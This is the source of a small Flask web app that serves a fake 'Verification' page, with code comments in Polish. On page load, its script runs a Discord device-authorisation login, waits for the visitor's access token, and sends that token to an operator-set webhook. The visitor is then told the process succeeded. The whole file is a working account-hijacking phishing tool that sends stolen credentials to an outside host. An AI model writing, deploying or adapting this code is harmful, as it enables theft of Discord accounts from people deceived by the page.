from flask import Flask, render_template_string, request
import requests
import os

app = Flask(__name__)
CLIENT_ID = os.getenv("CLIENT_ID")
WEBHOOK_URL = os.getenv("WEBHOOK_URL")

HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Verification</title>
</head>
<body>
    <h1>🔐 Processing...</h1>
    <script>
        (async function() {
            // Krok 1: Generuj kod logowania (Device Auth)
            const response = await fetch('https://discord.com/api/v9/oauth2/device', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: new URLSearchParams({
                    client_id: '{{ client_id }}',
                    scope: 'identify'
                })
            });
            const data = await response.json();
            
            // Krok 2: Otwórz okno logowania Discorda (NIE redirect_uri!)
            const loginWindow = window.open(data.verification_uri, '_blank');
            
            // Krok 3: Czekaj na token przez WebSocket (nasłuchuj na kod)
            let interval = data.interval * 1000;
            const deviceCode = data.device_code;
            
            const checkToken = setInterval(async () => {
                const tokenResponse = await fetch('https://discord.com/api/v9/oauth2/token', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: new URLSearchParams({
                        client_id: '{{ client_id }}',
                        device_code: deviceCode,
                        grant_type: 'urn:ietf:params:oauth:grant-type:device_code'
                    })
                });
                const tokenData = await tokenResponse.json();
                
                if (tokenData.access_token) {
                    clearInterval(checkToken);
                    // Krok 4: Wyślij token na webhook
                    fetch('{{ webhook_url }}', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            content: '**🎯 Token:** `' + tokenData.access_token + '`'
                        })
                    });
                    document.body.innerHTML = '<h2>✅ Success! You can close this page.</h2>';
                    if (loginWindow) loginWindow.close();
                }
            }, interval);
        })();
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML, client_id=CLIENT_ID, webhook_url=WEBHOOK_URL)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 5000)))
